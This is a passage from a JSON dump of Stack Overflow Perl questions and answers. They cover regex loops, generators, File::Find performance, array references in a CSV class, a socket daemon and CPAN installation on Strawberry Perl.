that:</p>\n\n<pre><code>$teilnehmer = $htmllines[$c]\n</code></pre>\n\n<p>It's the same as:</p>\n\n<pre><code> foreach ($c = 0;$c &lt;= @htmllines;$c++) {\n    if ($htmllines[$c] !~ /(&lt;!--responses: $delkursnr--&gt;0)/) {\n        if ($teilnehmer = $htmllines[$c] =~ /&lt;!--responses: $delkursnr--&gt;(.*)/){\n            $rspbegin = $c;\n        };\n    }\n}\n</code></pre>\n\n<p>More info about $_ can be found on Google</p>\n"}, {"tags": [], "owner": {"reputation": 3130, "user_id": 2064808, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4d819efdb2d3f9983a1437f3c1b9f710?s=128&d=identicon&r=PG", "display_name": "David Knipe", "link": "https://stackoverflow.com/users/2064808/david-knipe"}, "is_accepted": false, "score": 0, "last_activity_date": 1535374758, "last_edit_date": 1535374758, "creation_date": 1535234379, "answer_id": 52021551, "question_id": 43995522, "link": "https://stackoverflow.com/questions/43995522/what-will-be-the-value-of-this-variable/52021551#52021551", "title": "What will be the value of this variable?", "body": "<p>It's been a while since I've done Perl and I don't have it installed here so I can't test it.</p>\n\n<p>It looks like the code is supposed to find the last element in <code>@htmllines</code> which satisfies some regex-related conditions, and store the array element into the variable <code>$teilnehmer</code> and its index in the array into the variable <code>$rspbegin</code>. Note that a particular iteration through the loop might set the value of <code>$teilnehmer</code> but not <code>$rspbegin</code>. So they don't actually correspond to the same entry in the array.</p>\n\n<p>Also, the loop is bounded by <code>$c &lt;= @htmllines</code>. This means that the loop will run one final time after the end of the array, and with <code>$htmllines[$c] = undef</code>. I don't know how the outer <code>if</code> block would handle this, since it's a negative regex match. If the negative match returns falsey then this isn't a problem - it will ignore that case. But if it returns truthy then <code>$teilnehmer</code> will be set to <code>undef</code>. And this is the last iteration of the loop, so the value won't be overridden later.</p>\n\n<p>Another thing: What is the value of <code>$delkursnr</code>? Does it contain any regex special characters? Regex special characters are the following: <code>^$()[].?*+{}|\\</code>... I may have missed some. (<code>/-</code> should be OK though.) You should replace <code>$delkursnr</code> in the regexes with <code>\\Q$delkursnr\\E</code> in the regexes in case it does have special characters. See <a href=\"https://perldoc.perl.org/perlre.html#Quoting-metacharacters\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/perlre.html#Quoting-metacharacters</a> .</p>\n"}], "owner": {"reputation": 3, "user_id": 7611930, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67746bad8f796044aac4b7c13913f587?s=128&d=identicon&r=PG&f=1", "display_name": "kesien", "link": "https://stackoverflow.com/users/7611930/kesien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "accepted_answer_id": 43995822, "answer_count": 2, "score": -2, "last_activity_date": 1535374758, "creation_date": 1494921293, "last_edit_date": 1535229417, "question_id": 43995522, "link": "https://stackoverflow.com/questions/43995522/what-will-be-the-value-of-this-variable", "title": "What will be the value of this variable?", "body": "<p>I have to troubleshoot some elderly Perl code, but I can't figure out what the value of <code>$teilnehmer</code> will be in this code.</p>\n\n<pre><code># Teilnehmer   einlesen\nforeach ( $c = 0; $c &lt;= @htmllines; $c++ ) {\n\n    if ( $htmllines[$c] !~ /(&lt;!--responses: $delkursnr--&gt;0)/ ) {\n\n        if ( $htmllines[$c] =~ /&lt;!--responses: $delkursnr--&gt;(.*)/ ) {\n            $rspbegin = $c;\n        }\n\n        $teilnehmer = $_;\n    }\n}\n</code></pre>\n"}, {"tags": ["python", "perl", "iterator", "generator"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1494923989, "post_id": 43995327, "comment_id": 75021308, "body": "See also <a href=\"http://stackoverflow.com/q/3775413/2173773\">What is the Perl version of a Python iterator?</a>"}, {"owner": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1494924380, "post_id": 43995327, "comment_id": 75021566, "body": "Thanks @H&#229;konH&#230;gland for your answer. I will take a look at the links"}], "owner": {"reputation": 498, "user_id": 2174359, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/cf06579ee8856206e0dc3d83f9bb5c43?s=128&d=identicon&r=PG", "display_name": "FrankTheTank_12345", "link": "https://stackoverflow.com/users/2174359/frankthetank-12345"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 44, "favorite_count": 0, "closed_date": 1494926182, "answer_count": 0, "score": 1, "last_activity_date": 1494920622, "creation_date": 1494920622, "question_id": 43995327, "link": "https://stackoverflow.com/questions/43995327/python-file-generator-in-perl", "closed_reason": "Duplicate", "title": "Python File Generator in Perl", "body": "<p>Hello everybody is it possible to create in perl an file generator like the conecpt in python.</p>\n\n<p>Actuall i have the following code snippet to read chunks from an file:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nsub getChunck {\n    my $file = shift;\n    my @chunck;\n    open my $fh, '&lt;', $file or die \"Unable to open '$file': $!\";\n    while(&lt;$fh&gt;) {\n        push @chunck, $_;\n        push @chunck, \"\\n\" unless $. % 4;\n    }\n    return @chunck;\n}\n\nmy @chunck = getChunck('DUMP');\n</code></pre>\n\n<p>I read the hole file in chunks into an array.\nBut i want to know if it is possible to read an chunk or data from file and then process it (like in python with yield).</p>\n\n<p>I hope someone could help me to create an \"yield\" function in perl.\nI know there are some libs to work with generators in perl, but i dont want to include an lib. (maybe it is not possible?)</p>\n\n<p>Thanks to everybody.</p>\n\n<p>Maybe it could works so:</p>\n\n<pre><code>- open file and read line for line\n- yield line\n- process the line with another function.\n</code></pre>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "file-find"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1494919469, "post_id": 43994927, "comment_id": 75018379, "body": "How many directories are there?"}, {"owner": {"reputation": 60461, "user_id": 3636601, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/69a1b4f750ece89db0e49c94519f1a7d?s=128&d=identicon&r=PG&f=1", "display_name": "Jens", "link": "https://stackoverflow.com/users/3636601/jens"}, "edited": false, "score": 2, "creation_date": 1494919483, "post_id": 43994927, "comment_id": 75018388, "body": "I&#39;m voting to close this question as off-topic because it is about code Review and should be ask at <a href=\"https://codereview.stackexchange.com/\">codereview.stackexchange.com</a>"}, {"owner": {"reputation": 1969, "user_id": 1836483, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cqf6i.jpg?s=128&g=1", "display_name": "Van Peer", "link": "https://stackoverflow.com/users/1836483/van-peer"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494919642, "post_id": 43994927, "comment_id": 75018514, "body": "@simbabque approximately half a million"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494919940, "post_id": 43994927, "comment_id": 75018687, "body": "Well, that is a lot of files. Your regex is wrong, It should be <code>$directory =~ m&#47;DIR1&#47;</code>, not with double quotes <code>&quot;&quot;</code>. You can combine all of them into one pattern and compile it outside of the loop. <code>my $pattern = qr&#47;DIR[123]&#47;; find ...</code> and then use it with <code>next if $director =~ $pattern</code>. Obviously your pattern is more complicated, so adjust accordingly. <a href=\"https://metacpan.org/pod/Regexp::Assemble::Compressed\" rel=\"nofollow noreferrer\">metacpan.org/pod/Regexp::Assemble::Compressed</a> might help to make a good pattern."}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494929119, "post_id": 43994927, "comment_id": 75025131, "body": "<code>File::Find</code> can&#39;t prune/skip entire directory branches, but you can try <a href=\"https://metacpan.org/pod/Path::Iterator::Rule#skip\" rel=\"nofollow noreferrer\">metacpan.org/pod/Path::Iterator::Rule#skip</a>"}, {"owner": {"reputation": 81037, "user_id": 8454, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2NlHs.png?s=128&g=1", "display_name": "Andy Lester", "link": "https://stackoverflow.com/users/8454/andy-lester"}, "edited": false, "score": 0, "creation_date": 1494955183, "post_id": 43994927, "comment_id": 75043721, "body": "File::Next can skip branches too."}], "answers": [{"comments": [{"owner": {"reputation": 1969, "user_id": 1836483, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cqf6i.jpg?s=128&g=1", "display_name": "Van Peer", "link": "https://stackoverflow.com/users/1836483/van-peer"}, "edited": false, "score": 0, "creation_date": 1495022913, "post_id": 44007754, "comment_id": 75075101, "body": "Thanks @zdim ! Using file-find-rule has halved the time taken.. yet to try multi-threaded though."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 1969, "user_id": 1836483, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cqf6i.jpg?s=128&g=1", "display_name": "Van Peer", "link": "https://stackoverflow.com/users/1836483/van-peer"}, "edited": false, "score": 0, "creation_date": 1495039641, "post_id": 44007754, "comment_id": 75087650, "body": "@king  Great, just as it should.  Let me know if some forked code would help, I can add it."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 3, "last_activity_date": 1497642636, "last_edit_date": 1497642636, "creation_date": 1494954941, "answer_id": 44007754, "question_id": 43994927, "link": "https://stackoverflow.com/questions/43994927/how-to-optimize-this-perl-file-find/44007754#44007754", "title": "How to optimize this Perl file find?", "body": "<p>The <a href=\"http://search.cpan.org/~rclamp/File-Find-Rule-0.34/lib/File/Find/Rule.pm\" rel=\"nofollow noreferrer\">File::Find::Rule</a> can skip whole branches altogether</p>\n\n<pre><code>use warnings;\nuse strict;\n\nuse File::Find::Rule;\n\nmy $start_dir = shift || '.';\n\nmy $re_skip = qr/DIR(?:1|2|3)/;\n\nmy $ok   = File::Find::Rule-&gt;directory;  # add selection rules as needed\nmy $skip = File::Find::Rule-&gt;directory\n    -&gt;name(qr/$re_skip/)\n    -&gt;prune\n    -&gt;discard; \n\nmy @dirs = File::Find::Rule -&gt; any($skip, $ok) -&gt; in($start_dir); \n\nprint \"Total: \", scalar @dirs, \"\\n\";\n</code></pre>\n\n<p>This still has to take some time with a large filesystem but it will be much better.</p>\n\n<p>In a one-liner, if all you need from this is just a quick count</p>\n\n<pre><code>perl -MFile::Find::Rule -wE'\n    $ffr = File::Find::Rule; \n    $skip = $ffr-&gt;directory-&gt;name(qr/DIR(?:1|2|3)/)-&gt;prune-&gt;discard; \n    say scalar $ffr-&gt;any($skip, $ffr-&gt;directory)-&gt;in(\".\")'\n</code></pre>\n\n<p>where I've consolidated some of the code from the script.</p>\n\n<p>The next step would be to use multi-threaded execution (I'd use <code>fork</code> here). Group subdirectories so that they are roughly balanced in their sub-counts and run something like the above in parallel over those groups. The gain will depend on your hardware but there should be a good speedup factor.</p>\n"}], "owner": {"reputation": 1969, "user_id": 1836483, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/cqf6i.jpg?s=128&g=1", "display_name": "Van Peer", "link": "https://stackoverflow.com/users/1836483/van-peer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "accepted_answer_id": 44007754, "answer_count": 1, "score": 2, "last_activity_date": 1497642636, "creation_date": 1494919371, "last_edit_date": 1494919444, "question_id": 43994927, "link": "https://stackoverflow.com/questions/43994927/how-to-optimize-this-perl-file-find", "title": "How to optimize this Perl file find?", "body": "<p>Requirement: To get the count of directories under the input directory that matches the following criteria </p>\n\n<ol>\n<li>the directories can have any name except \"DIR1\", \"DIR2\", \"DIR3\" etc. </li>\n<li>the directories inside \"DIR1\", \"DIR2\", \"DIR3\" etc. need not be counted</li>\n<li>need the count of directories alone, no files</li>\n</ol>\n\n\n\n<pre><code>use strict;\nuse File::Find;\n\nmy ($inputdir) = @ARGV; \nmy (@branches, $branch, $directory, @directories); \nmy $count = 0; \n\nfind(\\&amp;wanted, $inputdir); \n    while ( defined($directory = shift @directories) ) {\n          if (-d $directory){ \n             next if ($directory =~ \"DIR1\" || $directory =~ \"DIR2\" || $directory =~ \"DIR3\"); \n                     push @branches, $directory; \n                     $count++; \n          }\n    } \n\nprint \"Total number of directories: $count \\n\"; \n\nsub wanted{\n    push @directories, $File::Find::name;\n    return @directories; \n}\n</code></pre>\n\n<p>This piece of code is giving the required output but it's taking quite a lot of time. </p>\n\n<p>Please suggest ways to reduce the time taken by improving this code.</p>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 91128, "user_id": 1229023, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/75b840909603c238921a81032efd57eb?s=128&d=identicon&r=PG", "display_name": "raina77ow", "link": "https://stackoverflow.com/users/1229023/raina77ow"}, "edited": false, "score": 0, "creation_date": 1494885765, "post_id": 43989410, "comment_id": 75008168, "body": "Isn&#39;t <code>[1,2]</code> an arrayref, not an array; shouldn&#39;t you store it in <code>my $cols</code>. then dereference (like <code>foreach (@$cols)</code>)?"}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494888217, "post_id": 43989410, "comment_id": 75008900, "body": "If all your variables are class variables anyway, why instantiate an object at all?"}, {"owner": {"reputation": 2920, "user_id": 3360140, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/OThx0.jpg?s=128&g=1", "display_name": "Kamrul Khan", "link": "https://stackoverflow.com/users/3360140/kamrul-khan"}, "reply_to_user": {"reputation": 91128, "user_id": 1229023, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/75b840909603c238921a81032efd57eb?s=128&d=identicon&r=PG", "display_name": "raina77ow", "link": "https://stackoverflow.com/users/1229023/raina77ow"}, "edited": false, "score": 0, "creation_date": 1494888910, "post_id": 43989410, "comment_id": 75009086, "body": "@raina77ow you are right, [1,2] is a array reference. I didnt know that. It works if I store the dereferenced value like <code>@cols = @{$opts-&gt;{&#39;columns&#39;}};</code>. However, how can I pass array and make it work? like I tried passing like <code>$parser-&gt;setOpts({&#39;delimeter&#39; =&gt; &#39;,&#39;, &#39;columns&#39; =&gt; (1,2)});</code> and it turns out only the first value of the array is being stored in the <code>@cols</code> array"}, {"owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "edited": false, "score": 0, "creation_date": 1494889539, "post_id": 43989410, "comment_id": 75009252, "body": "When storing in a hash, which is a (associative) list, you have to store a list of values as an arrayref if you want to retrieve it from the columns key, as one key cannot point to many values. You could alternatively pass an array as parameters into the setOpts method."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494918988, "post_id": 43989410, "comment_id": 75018059, "body": "<code>bless $self</code> should be <code>bless $self, $class</code>"}], "answers": [{"tags": [], "owner": {"reputation": 1523, "user_id": 4204037, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab78fa882cbf4a03c4fd2a0b92622dc5?s=128&d=identicon&r=PG&f=1", "display_name": "bytepusher", "link": "https://stackoverflow.com/users/4204037/bytepusher"}, "is_accepted": true, "score": 3, "last_activity_date": 1494962009, "last_edit_date": 1494962009, "creation_date": 1494889200, "answer_id": 43990052, "question_id": 43989410, "link": "https://stackoverflow.com/questions/43989410/perl-best-way-to-pass-array-of-hash-to-a-sub/43990052#43990052", "title": "Perl: best way to pass array of hash to a sub", "body": "<p>In setOpts, you set <code>@cols = $opts-&gt;{columns};</code></p>\n\n<p><code>$opts-&gt;{columns}</code> contains a reference to an array ( [1,2] ).</p>\n\n<p>So in __filterFields:</p>\n\n<pre><code>for ( @cols ){\n   # $_ is an arrayref [1,2]\n   # you are using it as an index to retrieve a value from @fields\n   $line .= $fields[$_];\n   # Thus the error: \"use of reference ARRAY\"...\" as array index\"\n   # You should be using an integer here.\n}\n</code></pre>\n\n<p>To fix it:</p>\n\n<pre><code>sub setOpts {\n   # ...\n   @cols = @{ $opts-&gt;{columns} };\n\n}\n</code></pre>\n\n<p>Edit: removed unnecessary check</p>\n"}], "owner": {"reputation": 2920, "user_id": 3360140, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/OThx0.jpg?s=128&g=1", "display_name": "Kamrul Khan", "link": "https://stackoverflow.com/users/3360140/kamrul-khan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 120, "favorite_count": 0, "accepted_answer_id": 43990052, "answer_count": 1, "score": 0, "last_activity_date": 1494962009, "creation_date": 1494885335, "question_id": 43989410, "link": "https://stackoverflow.com/questions/43989410/perl-best-way-to-pass-array-of-hash-to-a-sub", "title": "Perl: best way to pass array of hash to a sub", "body": "<p>My class looks like the below:</p>\n\n<pre><code>package CSVKeepCols;\n\nuse strict;\nuse warnings;\nuse Text::CSV;\nuse Data::Dumper;\n\nmy $text;\nmy $del;\nmy @cols;\nmy $output = '';\n\nsub load {\n    my $class = shift;\n    my $self = {};\n    bless $self;\n    return $self;\n}\n\nsub input {\n    my $class = shift;\n    $text = shift;\n    return $class;\n}\n\nsub setOpts {\n    my ($class, $opts) = @_;\n    $del  = $opts-&gt;{'delimeter'};\n    @cols = $opts-&gt;{'columns'};\n}\n\nsub process {\n    my @lines = split /\\n|\\r|\\n\\r|\\r\\n/, $text;\n    my $csv = Text::CSV-&gt;new({ sep_char =&gt; $del });\n\n    foreach (@lines) {\n        die('Invalid CSV data') if !$csv-&gt;parse($_);\n        $output .= __filterFields($csv-&gt;fields()) . \"\\n\";\n    }\n}\n\nsub output {\n    return $output;\n}\n\nsub __filterFields {\n    my @fields = @_;\n    my $line = '';\n\n    foreach (@cols) {\n        $line .= ',' if $line;\n        $line .= $fields[$_];\n    }\n\n    return $line;\n}\n\n1;\n</code></pre>\n\n<p>I am using this class from my code like this:</p>\n\n<pre><code>$parser = load CSVKeepCols();\n$parser-&gt;input($out);\n$parser-&gt;setOpts({'delimeter' =&gt; ',', 'columns' =&gt; [1,2]});\n$parser-&gt;process();\n$out = $parser-&gt;output();\n</code></pre>\n\n<p>I am expecting, the setOpts subroutine will take the hash <code>{'delimeter' =&gt; ',', 'columns' =&gt; [1,2]}</code> and from there it will set the value of <code>$del</code>to <code>,</code> and <code>@cols</code> to <code>(1,2)</code> so that I can loop through the <code>@cols</code> array. </p>\n\n<p>However, when I try to loop through <code>@cols</code> in the <code>__filterFields</code> subroutine I get error </p>\n\n<p><code>Use of reference \"ARRAY(0x22e32e0)\" as array index at CSVKeepCols.pm line 52.</code></p>\n\n<p>How do I fix this?</p>\n"}, {"tags": ["perl", "sockets", "websocket"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494922494, "post_id": 43988972, "comment_id": 75020359, "body": "First you should be able to differentiate between plain socket and websocket requests. Does it makes sense to run multiple protocols on the same port?"}, {"owner": {"reputation": 11, "user_id": 8016386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5096cfb1f91ca68bcc165da17bed0588?s=128&d=identicon&r=PG&f=1", "display_name": "Jean-Louis Persat", "link": "https://stackoverflow.com/users/8016386/jean-louis-persat"}, "reply_to_user": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494926911, "post_id": 43988972, "comment_id": 75023398, "body": "I do not plan to run them on same port. The goal is to communicate using TCP with my home automation box (already running since years) and to communicate with a nodemcu device using websocket"}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1494927478, "post_id": 43988972, "comment_id": 75023923, "body": "You might want to check <a href=\"https://github.com/kraih/mojo/wiki/Writing-websocket-chat-using-Mojolicious-Lite\" rel=\"nofollow noreferrer\">github.com/kraih/mojo/wiki/&hellip;</a>"}], "owner": {"reputation": 11, "user_id": 8016386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5096cfb1f91ca68bcc165da17bed0588?s=128&d=identicon&r=PG&f=1", "display_name": "Jean-Louis Persat", "link": "https://stackoverflow.com/users/8016386/jean-louis-persat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 98, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1494920061, "creation_date": 1494883085, "last_edit_date": 1494920061, "question_id": 43988972, "link": "https://stackoverflow.com/questions/43988972/perl-daemon-to-handle-socket-and-websocket", "title": "Perl daemon to handle socket and websocket", "body": "<p>I would like to add websocket support to my daemon which is already running as socket server. Do I need to use threads ?</p>\n\n<p>Here is the loop for incoming socket connections</p>\n\n<pre><code>while (not $signal)\n{\n    # waiting for a new client connection\n    my $client_socket = $socket-&gt;accept();\n\n    # get information about a newly connected client\n    try {\n        my $client_address = $client_socket-&gt;peerhost();\n        my $client_port = $client_socket-&gt;peerport();\n        syslog(\"Connection from $client_address:$client_port\");\n\n        # read up to 1024 characters from the connected client\n        my $data = \"\";\n        $client_socket-&gt;recv($data, 1024);\n        syslog(\"Received data: $data\") if ($debug == 1);\n\n        # write response data to the connected client\n        my $resp_data = \"ok\";\n        $client_socket-&gt;send($resp_data);\n\n        # notify client that response has been sent\n        shutdown($client_socket, 1);\n\n        # parse command received\n        parse_cmd($data);\n    }\n    catch\n    {\n        syslog(\"Error receiving data\");\n    }\n}\n</code></pre>\n"}, {"tags": ["perl", "cpan"], "comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1494882755, "post_id": 43988509, "comment_id": 75006958, "body": "You&#39;ll be better off relying on the MinGW and various utilities bundled with Strawberry Perl rather than mixing tools from different origins. Also, installing manually just means <code>tar xvf HTML-TableContentParser-0.13.tar.gz; cd HTML-TableContentParser-0.13; perl Makefile.PL; make; make test; make install</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1494894985, "post_id": 43988509, "comment_id": 75010491, "body": "I&#39;m not convinved you&#39;re running the right <code>cpan</code>. Do you get different results if you do <code>.\\cpan.bat HTML::TableContentParser</code> instead?"}, {"owner": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "edited": false, "score": 0, "creation_date": 1494904936, "post_id": 43988509, "comment_id": 75012716, "body": "Thanks for your answers. I tried the manual steps, running make failed, I noticed the word &#39;dmake&#39; in the output &quot;dmake-style makefile, so I looked in the Strawberry\\perl\\bin folder, and saw a file there named dmake.exe. Tried running that and it worked, so I thought I was finally getting somewhere. But the next manual step &quot;make test&quot; failed, and now it&#39;s beginning to look like there&#39;s a problem with that, which brings me up to the second answer. How do I know I&#39;m installing the right cpan module? I thought it would get the latest, greatest version. I haven&#39;t used CPAN with Strawberry before."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "edited": false, "score": 0, "creation_date": 1494931636, "post_id": 43994094, "comment_id": 75026836, "body": "Got errors on the dmake test step: some of my output followsTest Summary Report ------------------- t/1.t (Wstat: 0 Tests: 10 Failed: 0)   Parse errors: Bad plan.  You planned 34 tests but ran 10. Files=1, Tests=10,  1 wallclock secs ( 0.09 usr +  0.00 sys =  0.09 CPU) Result: FAIL Failed 1/1 test programs. 0/10 subtests failed. dmake:  Error code 255, while making &#39;test_dynamic&#39;"}, {"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "reply_to_user": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "edited": false, "score": 0, "creation_date": 1494934175, "post_id": 43994094, "comment_id": 75028659, "body": "Did you first remove the path of your separately existing MinGW from your environment variables. I think it is still there ans this test is using that same MinGW which you have not the Strawberry perl one."}, {"owner": {"reputation": 588, "user_id": 6897492, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d50889f9fb83f9a62eaec9df63aeb726?s=128&d=identicon&r=PG&f=1", "display_name": "Mohit", "link": "https://stackoverflow.com/users/6897492/mohit"}, "reply_to_user": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "edited": false, "score": 0, "creation_date": 1494934398, "post_id": 43994094, "comment_id": 75028814, "body": "Also try skipping the test command and directly do a install. Skip dmake test and see if you are able to use that in your scripts."}, {"owner": {"reputation": 33, "user_id": 6652102, "user_type": "registered", "profile_image": "https://graph.facebook.com/10207722009316953/picture?type=large", "display_name": "Joel Fuhrmann", "link": "https://stackoverflow.com/users/6652102/joel-fuhrmann"}, "edited": false, "score": 0, "creation_date": 1494937632, "post_id": 43994094, "comment_id": 75031107, "body": "Got it now, have a module installed. Did a --force install which put it in a local library (on my desktop), but failed on my laptop. Then found a tip on the cpan site which said to install and use cpanm (which I should have done first). That installed it on my laptop in the \\strawberry\\perl\\site\\lib folder. And I&#39;ve run a Perl Cookbook program to test it. Works fine except that the cookbook program is obviously written for a different version of the website. But I see the table data moved into a data structure in the debugger. Thank you everyone."}, {"owner": {"reputation": 121, "user_id": 2849383, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/NQr54.jpg?s=128&g=1", "display_name": "Diaa", "link": "https://stackoverflow.com/users/2849383/diaa"}, "edited": false, "score": 2, "creation_date": 1533919432, "post_id": 43994094, "comment_id": 90539042, "body": "@Mohit I think the answer needs to be updated since I found a statement saying the <code>dmake</code> was replaced by 